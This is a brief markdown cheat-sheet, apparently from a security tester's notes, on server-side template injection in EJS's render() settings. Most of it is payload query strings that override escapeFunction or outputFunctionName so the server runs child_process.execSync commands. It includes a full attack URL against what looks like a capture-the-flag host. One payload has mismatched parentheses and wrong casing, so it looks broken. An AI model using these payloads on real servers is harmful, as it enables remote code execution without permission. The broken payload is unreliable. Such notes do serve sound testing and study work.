# EJS (Embedded Javascript Template)

> A misconfiguration in the `render()` method allows users to overwrite some configuration variables and execute code by adding a `setting` parameter in the get URL.

It requires to update some variables from the vulnerable field
- `settings[view options][client]=true`
- `settings[view options][escapeFunction]=1;return global.process.mainModule.constructor._load('child_process').execSync('ls');`

**Payload example**
```bash
https://magistral-intranet.casinolimit.bzh/balances/search?q=camille&settings[view%20options][client]=true&settings[view%20options][escapeFunction]=1;return%20global.process.mainModule.constructor._load(%27child_process%27).execSync(%27ls%27);
```

**Payloads**
```js
settings[view%20options][client]=true&settings[view%20options][escapeFunction]=1; return%20global.process.mainModule.constructor._load(%27child_process%27).execSync(%27ls%27);
```

```js
settings[view%20options][escapeFunction]=console.log; this.global.process.mainModule.require(%27child_process%27).execSync("ls");&settings[view%20options][client]=true
```

```js
settings[view options][outputFunctionName]=x;process.mainmodule.require('child_process').execSync('ls'));s
```

> [!NOTE] URL
> Be careful, it will require the payload to be nicely URL-encoded

# Resources

- https://eslam.io/posts/ejs-server-side-template-injection-rce/